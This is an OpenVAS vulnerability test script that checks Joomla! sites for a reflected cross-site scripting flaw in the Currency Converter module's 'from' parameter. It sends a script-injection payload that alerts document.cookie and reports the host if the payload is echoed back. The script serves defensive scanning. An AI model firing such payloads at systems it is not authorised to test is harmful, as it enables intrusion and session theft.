##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_mod_currencyconverter_xss_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.

Impact Level: Application";

tag_affected = "Joomla! Currency Converter Module version 1.0.0";

tag_insight = "The flaw is due to an input passed via 'from' parameter to
'/includes/convert.php' is not properly sanitised before being returned to
the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla with Currency Converter module and
is prone to cross-site scripting vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802588");
  script_version("$Revision: 9352 $");
  script_cve_id("CVE-2012-1018");
  script_bugtraq_id(51804);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-02-09 12:55:09 +0530 (Thu, 09 Feb 2012)");
  script_name("Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72917");
  script_xref(name : "URL" , value : "http://dl.packetstormsecurity.net/1202-exploits/joomlacurrencyconverter-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
joomlaPort = 0;
joomlaDir = "";
url = "";

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:joomlaPort)){
  exit(0);
}

## Get Joomla directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct attack
url = joomlaDir + '/modules/mod_currencyconverter/includes/convert.php?' +
                  'from="><script>alert(document.cookie)</script>';

## Confirm exploit worked properly or not
if(http_vuln_check(port:joomlaPort, url:url, pattern:"><script>alert\(" +
                                    "document.cookie\)</script>", check_header:TRUE)){
  security_message(joomlaPort);
}
